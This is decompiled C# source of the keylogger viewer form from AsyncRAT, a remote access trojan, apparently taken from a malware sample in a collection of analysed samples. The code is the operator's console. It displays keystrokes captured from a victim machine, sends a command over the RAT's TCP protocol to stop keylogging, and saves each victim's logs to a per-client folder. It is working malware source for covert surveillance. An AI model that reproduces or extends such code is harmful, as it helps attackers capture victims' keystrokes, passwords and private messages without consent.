// Decompiled with JetBrains decompiler
// Type: Server.Forms.FormKeylogger
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Server.Connection;
using Server.MessagePack;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Server.Forms
{
  public class FormKeylogger : Form
  {
    public StringBuilder Sb = new StringBuilder();
    private IContainer components;
    private ToolStrip toolStrip1;
    private ToolStripLabel toolStripLabel1;
    private ToolStripTextBox toolStripTextBox1;
    private ToolStripSeparator toolStripSeparator1;
    private ToolStripButton toolStripButton1;
    public RichTextBox richTextBox1;
    public System.Windows.Forms.Timer timer1;

    public FormKeylogger() => this.InitializeComponent();

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        if (this.Client.TcpClient.Connected)
          return;
        this.Close();
      }
      catch
      {
        this.Close();
      }
    }

    private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
    {
      this.Sb?.Clear();
      if (this.Client == null)
        return;
      ThreadPool.QueueUserWorkItem((WaitCallback) (o =>
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "keyLogger";
        msgPack.ForcePathObject("isON").AsString = "false";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }));
    }

    private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
    {
      this.richTextBox1.SelectionStart = 0;
      this.richTextBox1.SelectAll();
      this.richTextBox1.SelectionBackColor = Color.White;
      if (e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
        return;
      int num;
      for (int start = 0; start < this.richTextBox1.TextLength; start += num + this.toolStripTextBox1.Text.Length)
      {
        num = this.richTextBox1.Find(this.toolStripTextBox1.Text, start, RichTextBoxFinds.None);
        if (num == -1)
          break;
        this.richTextBox1.SelectionStart = num;
        this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
        this.richTextBox1.SelectionBackColor = Color.Yellow;
      }
    }

    private void ToolStripButton1_Click(object sender, EventArgs e)
    {
      try
      {
        string path = Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID + "\\Keylogger");
        if (!Directory.Exists(path))
          Directory.CreateDirectory(path);
        File.WriteAllText(path + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
      }
      catch
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormKeylogger));
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.toolStrip1 = new ToolStrip();
      this.toolStripLabel1 = new ToolStripLabel();
      this.toolStripTextBox1 = new ToolStripTextBox();
      this.toolStripSeparator1 = new ToolStripSeparator();
      this.toolStripButton1 = new ToolStripButton();
      this.richTextBox1 = new RichTextBox();
      this.toolStrip1.SuspendLayout();
      this.SuspendLayout();
      this.timer1.Interval = 1000;
      this.timer1.Tick += new EventHandler(this.Timer1_Tick);
      this.toolStrip1.ImageScalingSize = new Size(24, 24);
      this.toolStrip1.Items.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.toolStripLabel1,
        (ToolStripItem) this.toolStripTextBox1,
        (ToolStripItem) this.toolStripSeparator1,
        (ToolStripItem) this.toolStripButton1
      });
      this.toolStrip1.Location = new Point(0, 0);
      this.toolStrip1.Name = "toolStrip1";
      this.toolStrip1.Size = new Size(731, 34);
      this.toolStrip1.TabIndex = 0;
      this.toolStrip1.Text = "toolStrip1";
      this.toolStripLabel1.Name = "toolStripLabel1";
      this.toolStripLabel1.Size = new Size(64, 29);
      this.toolStripLabel1.Text = "Search";
      this.toolStripTextBox1.Name = "toolStripTextBox1";
      this.toolStripTextBox1.Size = new Size(100, 34);
      this.toolStripTextBox1.Text = "...";
      this.toolStripTextBox1.KeyDown += new KeyEventHandler(this.ToolStripTextBox1_KeyDown);
      this.toolStripSeparator1.Name = "toolStripSeparator1";
      this.toolStripSeparator1.Size = new Size(6, 34);
      this.toolStripButton1.DisplayStyle = ToolStripItemDisplayStyle.Text;
      this.toolStripButton1.Image = (Image) componentResourceManager.GetObject("toolStripButton1.Image");
      this.toolStripButton1.ImageTransparentColor = Color.Magenta;
      this.toolStripButton1.Name = "toolStripButton1";
      this.toolStripButton1.Size = new Size(53, 29);
      this.toolStripButton1.Text = "Save";
      this.toolStripButton1.Click += new EventHandler(this.ToolStripButton1_Click);
      this.richTextBox1.BorderStyle = BorderStyle.None;
      this.richTextBox1.Dock = DockStyle.Fill;
      this.richTextBox1.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.richTextBox1.Location = new Point(0, 34);
      this.richTextBox1.Name = "richTextBox1";
      this.richTextBox1.ReadOnly = true;
      this.richTextBox1.Size = new Size(731, 376);
      this.richTextBox1.TabIndex = 1;
      this.richTextBox1.Text = "";
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(731, 410);
      this.Controls.Add((Control) this.richTextBox1);
      this.Controls.Add((Control) this.toolStrip1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FormKeylogger);
      this.Text = "Keylogger";
      this.FormClosed += new FormClosedEventHandler(this.Keylogger_FormClosed);
      this.toolStrip1.ResumeLayout(false);
      this.toolStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
